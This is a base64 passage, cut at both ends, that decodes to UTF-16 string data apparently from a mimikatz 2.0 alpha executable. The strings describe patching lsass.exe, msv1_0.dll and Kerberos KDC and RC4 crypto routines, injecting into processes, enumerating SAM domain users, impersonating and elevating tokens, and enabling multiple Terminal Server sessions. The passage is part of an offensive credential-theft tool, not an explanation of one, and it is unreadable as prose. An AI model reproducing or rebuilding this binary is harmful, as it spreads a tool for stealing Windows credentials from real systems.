AXwBtAGkAcwBjAF8AZABlAHQAbwB1AHIAcwBfAGMAYQBsAGwAYgBhAGMAawBfAHAAcgBvAGMAZQBzAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFAAYQB0AGMAaAAgAE8ASwAgAGYAbwByACAAJwAlAHMAJwAgAGYAcgBvAG0AIAAnACUAcwAnACAAdABvACAAJwAlAHMAJwAgAEAAIAAlAHAACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBnAGUAbgBlAHIAaQBjAF8AbgBvAGcAcABvAF8AcABhAHQAYwBoACAAOwAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACAAKgAgAAAAIAAvACAAJQBzACAALQAgACUAcwAKAAAACQB8ACAAJQBzAAoAAAAAAGZvcGVuAAAAZndwcmludGYAAAAAZmNsb3NlAABsAHMAYQBzAHMALgBlAHgAZQAAAG0AcwB2ADEAXwAwAC4AZABsAGwAAAAAAEkAbgBqAGUAYwB0AGUAZAAgAD0AKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AbQBlAG0AcwBzAHAAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAtACAAVAByAGEAbQBwAG8AbABpAG4AZQAgAG4AMAAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AbQBlAG0AcwBzAHAAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAbQBvAHQAZQBsAGkAYgBfAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAEMAbwBkAGUAVwBpAHQAdABoAFAAYQB0AHQAZQByAG4AUgBlAHAAbABhAGMAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAALQAgAFQAcgBhAG0AcABvAGwAaQBuAGUAIABuADEAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAALQAgAHIAZQBhAGwAIABhAHMAbQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AcwBlAGEAcgBjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBtAGUAbQBzAHMAcAAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAG0AZQBtAHMAcwBwACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFAAcgBvAGMAZQBzAHMASQBkAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAExvY2FsQWxsb2MAAGsAZABjAHMAdgBjAC4AZABsAGwAAAAAAFsASwBEAEMAXQAgAGQAYQB0AGEACgAAAFsASwBEAEMAXQAgAHMAdAByAHUAYwB0AAoAAABbAEsARABDAF0AIABrAGUAeQBzACAAcABhAHQAYwBoACAATwBLAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBzAGsAZQBsAGUAdABvAG4AIAA7ACAAUwBlAGMAbwBuAGQAIABwAGEAdAB0AGUAcgBuACAAbgBvAHQAIABmAG8AdQBuAGQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AcwBrAGUAbABlAHQAbwBuACAAOwAgAEYAaQByAHMAdAAgAHAAYQB0AHQAZQByAG4AIABuAG8AdAAgAGYAbwB1AG4AZAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAHMAYwBfAHMAawBlAGwAZQB0AG8AbgAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABWAGUAcgB5AEIAYQBzAGkAYwBNAG8AZAB1AGwAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwBGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAABjAHIAeQBwAHQAZABsAGwALgBkAGwAbAAAAAAAWwBSAEMANABdACAAZgB1AG4AYwB0AGkAbwBuAHMACgAAAAAAWwBSAEMANABdACAAaQBuAGkAdAAgAHAAYQB0AGMAaAAgAE8ASwAKAAAAAABbAFIAQwA0AF0AIABkAGUAYwByAHkAcAB0ACAAcABhAHQAYwBoACAATwBLAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAcwBjAF8AcwBrAGUAbABlAHQAbwBuACAAOwAgAFUAbgBhAGIAbABlACAAdABvACAAYwByAGUAYQB0AGUAIAByAGUAbQBvAHQAZQAgAGYAdQBuAGMAdABpAG8AbgBzAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBzAGMAXwBzAGsAZQBsAGUAdABvAG4AIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAGcAcgBvAHUAcAAAAGwAbwBjAGEAbABnAHIAbwB1AHAAAAAAAG4AZQB0AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4ARABvAG0AYQBpAG4AIABCAHUAaQBsAHQAaQBuACAAKAA/ACkAIAAlADAAOAB4AAoAAAAKAEQAbwBtAGEAaQBuACAAbgBhAG0AZQAgADoAIAAlAHcAWgAAAAAACgBEAG8AbQBhAGkAbgAgAFMASQBEACAAIAA6ACAAAAAKACAAJQAtADUAdQAgACUAdwBaAAAAAAAKACAAfAAgACUALQA1AHUAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBMAG8AbwBrAHUAcABJAGQAcwBJAG4ARABvAG0AYQBpAG4AIAAlADAAOAB4AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEcAZQB0AEcAcgBvAHUAcABzAEYAbwByAFUAcwBlAHIAIAAlADAAOAB4AAAAAAAKACAAfABgACUALQA1AHUAIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEcAZQB0AEEAbABpAGEAcwBNAGUAbQBiAGUAcgBzAGgAaQBwACAAJQAwADgAeAAAAAAACgAgAHwAtAAlAC0ANQB1ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0AUgBpAGQAVABvAFMAaQBkACAAJQAwADgAeAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAE8AcABlAG4AVQBzAGUAcgAgACUAMAA4AHgAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBFAG4AdQBtAGUAcgBhAHQAZQBVAHMAZQByAHMASQBuAEQAbwBtAGEAaQBuACAAJQAwADgAeAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBuAGUAdABfAHUAcwBlAHIAIAA7ACAAUwBhAG0ATwBwAGUAbgBEAG8AbQBhAGkAbgAgACUAMAA4AHgAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEwAbwBvAGsAdQBwAEQAbwBtAGEAaQBuAEkAbgBTAGEAbQBTAGUAcgB2AGUAcgAgACUAMAA4AHgAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG4AZQB0AF8AdQBzAGUAcgAgADsAIABTAGEAbQBFAG4AdQBtAGUAcgBhAHQAZQBEAG8AbQBhAGkAbgBzAEkAbgBTAGEAbQBTAGUAcgB2AGUAcgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbgBlAHQAXwB1AHMAZQByACAAOwAgAFMAYQBtAEMAbwBuAG4AZQBjAHQAIAAlADAAOAB4AAoAAAAAAEEAcwBrACAAZABlAGIAdQBnACAAcAByAGkAdgBpAGwAZQBnAGUAAABkAGUAYgB1AGcAAABQAHIAaQB2AGkAbABlAGcAZQAgAG0AbwBkAHUAbABlAAAAAABwAHIAaQB2AGkAbABlAGcAZQAAAFAAcgBpAHYAaQBsAGUAZwBlACAAJwAlAHUAJwAgAE8ASwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBpAHYAaQBsAGUAZwBlAF8AcwBpAG0AcABsAGUAIAA7ACAAUgB0AGwAQQBkAGoAdQBzAHQAUAByAGkAdgBpAGwAZQBnAGUAIAAoACUAdQApACAAJQAwADgAeAAKAAAAUgBlAHMAdQBtAGUAIABhACAAcAByAG8AYwBlAHMAcwAAAAAAcgBlAHMAdQBtAGUAAAAAAFMAdQBzAHAAZQBuAGQAIABhACAAcAByAG8AYwBlAHMAcwAAAHMAdQBzAHAAZQBuAGQAAABUAGUAcgBtAGkAbgBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzAAAAcwB0AG8AcAAAAAAAUwB0AGEAcgB0ACAAYQAgAHAAcgBvAGMAZQBzAHMAAABzAHQAYQByAHQAAABMAGkAcwB0ACAAaQBtAHAAbwByAHQAcwAAAAAAaQBtAHAAbwByAHQAcwAAAEwAaQBzAHQAIABlAHgAcABvAHIAdABzAAAAAABlAHgAcABvAHIAdABzAAAAUAByAG8AYwBlAHMAcwAgAG0AbwBkAHUAbABlAAAAAABUAHIAeQBpAG4AZwAgAHQAbwAgAHMAdABhAHIAdAAgACIAJQBzACIAIAA6ACAAAABPAEsAIAAhACAAKABQAEkARAAgACUAdQApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBzAHQAYQByAHQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AYwByAGUAYQB0AGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAATgB0AFQAZQByAG0AaQBuAGEAdABlAFAAcgBvAGMAZQBzAHMAAAAAAE4AdABTAHUAcwBwAGUAbgBkAFAAcgBvAGMAZQBzAHMAAAAAAE4AdABSAGUAcwB1AG0AZQBQAHIAbwBjAGUAcwBzAAAAJQBzACAAbwBmACAAJQB1ACAAUABJAEQAIAA6ACAATwBLACAAIQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAG4AZQByAGkAYwBPAHAAZQByAGEAdABpAG8AbgAgADsAIAAlAHMAIAAwAHgAJQAwADgAeAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAbgBlAHIAaQBjAE8AcABlAHIAYQB0AGkAbwBuACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQBuAGUAcgBpAGMATwBwAGUAcgBhAHQAaQBvAG4AIAA7ACAAcABpAGQAIAAoAC8AcABpAGQAOgAxADIAMwApACAAaQBzACAAbQBpAHMAcwBpAG4AZwAAACUAdQAJACUAdwBaAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AYwBhAGwAbABiAGEAYwBrAFAAcgBvAGMAZQBzAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBjAGEAbABsAGIAYQBjAGsAUAByAG8AYwBlAHMAcwAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AbwBwAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAACgAlAHcAWgAAAAAACgAJACUAcAAgAC0APgAgACUAdQAAAAAACQAlAHUAAAAJACAAAAAAAAkAJQBwAAAACQAlAFMAAAAJAC0APgAgACUAUwAAAAAACgAJACUAcAAgAC0APgAgACUAcAAJACUAUwAgACEAIAAAAAAAJQBTAAAAAAAjACUAdQAAAEwAaQBzAHQAIABzAGUAcgB2AGkAYwBlAHMAAABTAGgAdQB0AGQAbwB3AG4AIABzAGUAcgB2AGkAYwBlAAAAAABzAGgAdQB0AGQAbwB3AG4AAAAAAFAAcgBlAHMAaAB1AHQAZABvAHcAbgAgAHMAZQByAHYAaQBjAGUAAABwAHIAZQBzAGgAdQB0AGQAbwB3AG4AAABSAGUAcwB1AG0AZQAgAHMAZQByAHYAaQBjAGUAAAAAAFMAdQBzAHAAZQBuAGQAIABzAGUAcgB2AGkAYwBlAAAAUwB0AG8AcAAgAHMAZQByAHYAaQBjAGUAAAAAAFIAZQBtAG8AdgBlACAAcwBlAHIAdgBpAGMAZQAAAAAAUwB0AGEAcgB0ACAAcwBlAHIAdgBpAGMAZQAAAFMAZQByAHYAaQBjAGUAIABtAG8AZAB1AGwAZQAAAAAAJQBzACAAJwAlAHMAJwAgAHMAZQByAHYAaQBjAGUAIAA6ACAAAAAAAAAAAABFAFIAUgBPAFIAIABnAGUAbgBlAHIAaQBjAEYAdQBuAGMAdABpAG8AbgAgADsAIABTAGUAcgB2AGkAYwBlACAAbwBwAGUAcgBhAHQAaQBvAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGcAZQBuAGUAcgBpAGMARgB1AG4AYwB0AGkAbwBuACAAOwAgAEkAbgBqAGUAYwB0ACAAbgBvAHQAIABhAHYAYQBpAGwAYQBiAGwAZQAKAAAAAAAAAEUAUgBSAE8AUgAgAGcAZQBuAGUAcgBpAGMARgB1AG4AYwB0AGkAbwBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIABzAGUAcgB2AGkAYwBlACAAbgBhAG0AZQAgAGEAcgBnAHUAbQBlAG4AdAAKAAAAAABTAHQAYQByAHQAaQBuAGcAAAAAAFIAZQBtAG8AdgBpAG4AZwAAAAAAUwB0AG8AcABwAGkAbgBnAAAAAABTAHUAcwBwAGUAbgBkAGkAbgBnAAAAAABSAGUAcwB1AG0AaQBuAGcAAAAAAFAAcgBlAHMAaAB1AHQAZABvAHcAbgAAAFMAaAB1AHQAZABvAHcAbgAAAAAAcwBlAHIAdgBpAGMAZQBzAC4AZQB4AGUAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBzAGUAcgB2AGkAYwBlAF8AcwBlAG4AZABjAG8AbgB0AHIAbwBsAF8AaQBuAHAAcgBvAGMAZQBzAHMAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAHMAZQBhAHIAYwBoACAAKAAwAHgAJQAwADgAeAApAAoAAABlAHIAcgBvAHIAIAAlAHUACgAAAE8ASwAhAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AcwBlAHIAdgBpAGMAZQBfAHMAZQBuAGQAYwBvAG4AdAByAG8AbABfAGkAbgBwAHIAbwBjAGUAcwBzACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBjAHIAZQBhAHQAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAHMAZQByAHYAaQBjAGUAXwBzAGUAbgBkAGMAbwBuAHQAcgBvAGwAXwBpAG4AcAByAG8AYwBlAHMAcwAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AcwBlAHIAdgBpAGMAZQBfAHMAZQBuAGQAYwBvAG4AdAByAG8AbABfAGkAbgBwAHIAbwBjAGUAcwBzACAAOwAgAE4AbwB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIAB3AGkAdABoAG8AdQB0ACAAUwBjAFMAZQBuAGQAQwBvAG4AdAByAG8AbAAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAHMAZQByAHYAaQBjAGUAXwBzAGUAbgBkAGMAbwBuAHQAcgBvAGwAXwBpAG4AcAByAG8AYwBlAHMAcwAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAATQBhAHIAawAgAGEAYgBvAHUAdAAgAFAAdABIAAAAAABtAGEAcgBrAHIAdQBzAHMAAAAAAEMAaABhAG4AZwBlACAAbwByACAAZABpAHMAcABsAGEAeQAgAGMAdQByAHIAZQBuAHQAIABkAGkAcgBlAGMAdABvAHIAeQAAAGMAZAAAAAAARABpAHMAcABsAGEAeQAgAHMAbwBtAGUAIAB2AGUAcgBzAGkAbwBuACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAHMAAAB2AGUAcgBzAGkAbwBuAAAAAAAAAFMAdwBpAHQAYwBoACAAZgBpAGwAZQAgAG8AdQB0AHAAdQB0AC8AYgBhAHMAZQA2ADQAIABvAHUAdABwAHUAdAAAAAAAYgBhAHMAZQA2ADQAAAAAAAAAAABMAG8AZwAgAG0AaQBtAGkAawBhAHQAegAgAGkAbgBwAHUAdAAvAG8AdQB0AHAAdQB0ACAAdABvACAAZgBpAGwAZQAAAAAAAABTAGwAZQBlAHAAIABhAG4AIABhAG0AbwB1AG4AdAAgAG8AZgAgAG0AaQBsAGwAaQBzAGUAYwBvAG4AZABzAAAAcwBsAGUAZQBwAAAAUABsAGUAYQBzAGUALAAgAG0AYQBrAGUAIABtAGUAIABhACAAYwBvAGYAZgBlAGUAIQAAAGMAbwBmAGYAZQBlAAAAAABBAG4AcwB3AGUAcgAgAHQAbwAgAHQAaABlACAAVQBsAHQAaQBtAGEAdABlACAAUQB1AGUAcwB0AGkAbwBuACAAbwBmACAATABpAGYAZQAsACAAdABoAGUAIABVAG4AaQB2AGUAcgBzAGUALAAgAGEAbgBkACAARQB2AGUAcgB5AHQAaABpAG4AZwAAAGEAbgBzAHcAZQByAAAAAAAAAAAAQwBsAGUAYQByACAAcwBjAHIAZQBlAG4AIAAoAGQAbwBlAHMAbgAnAHQAIAB3AG8AcgBrACAAdwBpAHQAaAAgAHIAZQBkAGkAcgBlAGMAdABpAG8AbgBzACwAIABsAGkAawBlACAAUABzAEUAeABlAGMAKQAAAAAAYwBsAHMAAABRAHUAaQB0ACAAbQBpAG0AaQBrAGEAdAB6AAAAZQB4AGkAdAAAAAAAQgBhAHMAaQBjACAAYwBvAG0AbQBhAG4AZABzACAAKABkAG8AZQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlACAAbQBvAGQAdQBsAGUAIABuAGEAbQBlACkAAABTAHQAYQBuAGQAYQByAGQAIABtAG8AZAB1AGwAZQAAAHMAdABhAG4AZABhAHIAZAAAAAAAQgB5AGUAIQAKAAAANAAyAC4ACgAAAAAACgAgACAAIAAgACgAIAAoAAoAIAAgACAAIAAgACkAIAApAAoAIAAgAC4AXwBfAF8AXwBfAF8ALgAKACAAIAB8ACAAIAAgACAAIAAgAHwAXQAKACAAIABcACAAIAAgACAAIAAgAC8ACgAgACAAIABgAC0ALQAtAC0AJwAKAAAAAABTAGwAZQBlAHAAIAA6ACAAJQB1ACAAbQBzAC4ALgAuACAAAABFAG4AZAAgACEACgAAAAAAbQBpAG0AaQBrAGEAdAB6AC4AbABvAGcAAAAAAFUAcwBpAG4AZwAgACcAJQBzACcAIABmAG8AcgAgAGwAbwBnAGYAaQBsAGUAIAA6ACAAJQBzAAoAAAAAAHQAcgB1AGUAAAAAAGYAYQBsAHMAZQAAAGkAcwBCAGEAcwBlADYANABJAG4AdABlAHIAYwBlAHAAdAAgAHcAYQBzACAAIAAgACAAOgAgACUAcwAKAAAAAABpAHMAQgBhAHMAZQA2ADQASQBuAHQAZQByAGMAZQBwAHQAIABpAHMAIABuAG8AdwAgADoAIAAlAHMACgAAAAAANgA0AAAAAAA4ADYAAAAAAAAAAAAKAG0AaQBtAGkAawBhAHQAegAgADIALgAwACAAYQBsAHAAaABhACAAKABhAHIAYwBoACAAeAA4ADYAKQAKAE4AVAAgACAAIAAgACAALQAgACAAVwBpAG4AZABvAHcAcwAgAE4AVAAgACUAdQAuACUAdQAgAGIAdQBpAGwAZAAgACUAdQAgACgAYQByAGMAaAAgAHgAJQBzACkACgAAAAAAQwB1AHIAOgAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwB0AGEAbgBkAGEAcgBkAF8AYwBkACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGcAZQB0AEMAdQByAHIAZQBuAHQARABpAHIAZQBjAHQAbwByAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAATgBlAHcAOgAgACUAcwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAdABhAG4AZABhAHIAZABfAGMAZAAgADsAIABTAGUAdABDAHUAcgByAGUAbgB0AEQAaQByAGUAYwB0AG8AcgB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFMAbwByAHIAeQAgAHkAbwB1ACAAZwB1AHkAcwAgAGQAbwBuACcAdAAgAGcAZQB0ACAAaQB0AC4ACgAAAFUAbgBrAG4AbwB3AG4AAABEAGUAbABlAGcAYQB0AGkAbwBuAAAAAABJAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuAAAASQBkAGUAbgB0AGkAZgBpAGMAYQB0AGkAbwBuAAAAAABBAG4AbwBuAHkAbQBvAHUAcwAAAFIAZQB2AGUAcgB0ACAAdABvACAAcAByAG8AYwBlAHMAIAB0AG8AawBlAG4AAAAAAHIAZQB2AGUAcgB0AAAAAABJAG0AcABlAHIAcwBvAG4AYQB0AGUAIABhACAAdABvAGsAZQBuAAAAZQBsAGUAdgBhAHQAZQAAAEwAaQBzAHQAIABhAGwAbAAgAHQAbwBrAGUAbgBzACAAbwBmACAAdABoAGUAIABzAHkAcwB0AGUAbQAAAEQAaQBzAHAAbABhAHkAIABjAHUAcgByAGUAbgB0ACAAaQBkAGUAbgB0AGkAdAB5AAAAAAB3AGgAbwBhAG0AaQAAAAAAVABvAGsAZQBuACAAbQBhAG4AaQBwAHUAbABhAHQAaQBvAG4AIABtAG8AZAB1AGwAZQAAAHQAbwBrAGUAbgAAACAAKgAgAFAAcgBvAGMAZQBzAHMAIABUAG8AawBlAG4AIAA6ACAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAHcAaABvAGEAbQBpACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwBUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAIAAqACAAVABoAHIAZQBhAGQAIABUAG8AawBlAG4AIAAgADoAIAAAAG4AbwAgAHQAbwBrAGUAbgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AdwBoAG8AYQBtAGkAIAA7ACAATwBwAGUAbgBUAGgAcgBlAGEAZABUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAGQAbwBtAGEAaQBuAGEAZABtAGkAbgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlACAAOwAgAGsAdQBsAGwAXwBtAF8AbABvAGMAYQBsAF8AZABvAG0AYQBpAG4AXwB1AHMAZQByAF8AZwBlAHQAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgBTAEkARAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAcwB5AHMAdABlAG0AAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAATgBvACAAdQBzAGUAcgBuAGEAbQBlACAAYQB2AGEAaQBsAGEAYgBsAGUAIAB3AGgAZQBuACAAUwBZAFMAVABFAE0ACgAAAFQAbwBrAGUAbgAgAEkAZAAgACAAOgAgACUAdQAKAFUAcwBlAHIAIABuAGEAbQBlACAAOgAgACUAcwAKAFMASQBEACAAbgBhAG0AZQAgACAAOgAgAAAAAAAlAHMAXAAlAHMACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABrAHUAbABsAF8AbQBfAHQAbwBrAGUAbgBfAGcAZQB0AE4AYQBtAGUARABvAG0AYQBpAG4ARgByAG8AbQBTAEkARAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABrAHUAbABsAF8AbQBfAGwAbwBjAGEAbABfAGQAbwBtAGEAaQBuAF8AdQBzAGUAcgBfAEMAcgBlAGEAdABlAFcAZQBsAGwASwBuAG8AdwBuAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AcgBlAHYAZQByAHQAIAA7ACAAUwBlAHQAVABoAHIAZQBhAGQAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACUALQAxADAAdQAJAAAAAAAlAHMAXAAlAHMACQAlAHMAAAAAAAkAKAAlADAAMgB1AGcALAAlADAAMgB1AHAAKQAJACUAcwAAACAAKAAlAHMAKQAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAXwBjAGEAbABsAGIAYQBjAGsAIAA7ACAAQwBoAGUAYwBrAFQAbwBrAGUAbgBNAGUAbQBiAGUAcgBzAGgAaQBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACUAdQAJAAAAIAAtAD4AIABJAG0AcABlAHIAcwBvAG4AYQB0AGUAZAAgACEACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlAF8AYwBhAGwAbABiAGEAYwBrACAAOwAgAFMAZQB0AFQAaAByAGUAYQBkAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABwAGEAdABjAGgAIABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIAB0AG8AIABhAGwAbABvAHcAIABtAHUAbAB0AGkAcABsAGUAcwAgAHUAcwBlAHIAcwAAAG0AdQBsAHQAaQByAGQAcAAAAAAAVABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABtAG8AZAB1AGwAZQAAAAAAdABzAAAAAAB0AGUAcgBtAHMAcgB2AC4AZABsAGwAAABUAGUAcgBtAFMAZQByAHYAaQBjAGUAAABkAG8AbQBhAGkAbgBfAGUAeAB0AGUAbgBkAGUAZAAAAGcAZQBuAGUAcgBpAGMAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAAABkAG8AbQBhAGkAbgBfAHYAaQBzAGkAYgBsAGUAXwBwAGEAcwBzAHcAbwByAGQAAABkAG8AbQBhAGkAbgBfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQAAAAAAZABvAG0AYQBpAG4AXwBwAGEAcwBzAHcAbwByAGQAAABnAGUAbgBlAHIAaQBjAAAAQgBpAG8AbQBlAHQAcgBpAGMAAABQAGkAYwB0AHUAcgBlACAAUABhAHMAcwB3AG8AcgBkAAAAAABQAGkAbgAgAEwAbwBnAG8AbgAAAEQAbwBtAGEAaQBuACAARQB4AHQAZQBuAGQAZQBkAAAARABvAG0AYQBpAG4AIABDAGUAcgB0AGkAZgBpAGMAYQ